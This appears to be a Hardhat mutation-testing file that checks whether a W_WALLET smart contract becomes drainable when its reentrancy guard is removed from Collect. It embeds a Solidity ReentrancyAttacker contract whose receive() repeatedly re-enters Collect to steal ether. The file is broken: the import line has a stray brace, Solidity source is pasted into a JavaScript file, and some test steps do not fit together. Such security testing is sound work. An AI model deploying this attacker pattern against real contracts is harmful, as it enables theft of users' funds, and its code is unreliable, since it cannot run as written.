import { expect } from "chai";
import { ethers } } from "hardhat";

describe("W_WALLET mutant m70b4f541 test - reentrancy guard removal", function () {
  it("should detect reentrancy vulnerability when nonReentrant_ modifier is removed from Collect", async function () {
    const [owner, attacker, user] = await ethers.getSigners();
    
    // Deploy the Log contract first (required constructor argument for W_WALLET)
    const LogFactory = await ethers.getContractFactory("Log");
    const log = await LogFactory.deploy();
    await log.waitForDeployment();
    
    // Deploy W_WALLET with Log address
    const WalletFactory = await ethers.getContractFactory("W_WALLET");
    const wallet = await WalletFactory.deploy(await log.getAddress());
    await wallet.waitForDeployment();
    
    // Deploy a malicious contract that will perform the reentrancy attack
    const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await ReentrancyAttacker.deploy(await wallet.getAddress());
    await attackerContract.waitForDeployment();
    
    // Fund the attacker contract with 2 ether to have balance to withdraw
    await owner.sendTransaction({
      to: await attackerContract.getAddress(),
      value: ethers.parseEther("2")
    });
    
    // Attacker contract deposits 1 ether into wallet (via fallback)
    await attackerContract.connect(attacker).attack(ethers.parseEther("1"), { value: ethers.parseEther("1") });
    
    // Set unlock time to now so Collect can be called
    await wallet.connect(attacker).Put(0, { value: ethers.parseEther("0") });
    
    // Now trigger the reentrancy attack - attacker contract calls Collect(1 ether)
    // The malicious receive function will re-enter Collect before balance is updated
    await attackerContract.connect(attacker).startAttack(ethers.parseEther("1"));
    
    // Check that the attacker drained more than their balance
    const attackerContractBalance = await ethers.provider.getBalance(await attackerContract.getAddress());
    expect(attackerContractBalance).to.be.gt(ethers.parseEther("1")); // Should have stolen extra funds
    
    // The wallet balance should be unexpectedly low
    const walletBalance = await ethers.provider.getBalance(await wallet.getAddress());
    expect(walletBalance).to.be.lt(ethers.parseEther("1")); // Should have lost funds due to reentrancy
  });
});

// Malicious contract for reentrancy attack
contract ReentrancyAttacker {
    address public wallet;
    uint public targetAmount;
    
    constructor(address _wallet) {
        wallet = _wallet;
    }
    
    function attack(uint _amount) external payable {
        // Call Put to deposit into wallet
        (bool success, ) = wallet.call{value: msg.value}(abi.encodeWithSignature("Put(uint256)", 0));
        require(success, "Put failed");
    }
    
    function startAttack(uint _amount) external {
        targetAmount = _amount;
        // Call Collect on the wallet to trigger withdrawal and reentrancy
        (bool success, ) = wallet.call(abi.encodeWithSignature("Collect(uint256)", _amount));
        require(success, "Collect failed");
    }
    
    receive() external payable {
        if (address(wallet).balance >= targetAmount) {
            // Re-enter Collect before balance is updated
            (bool success, ) = wallet.call(abi.encodeWithSignature("Collect(uint256)", targetAmount));
            require(success, "Reentrancy Collect failed");
        }
    }
}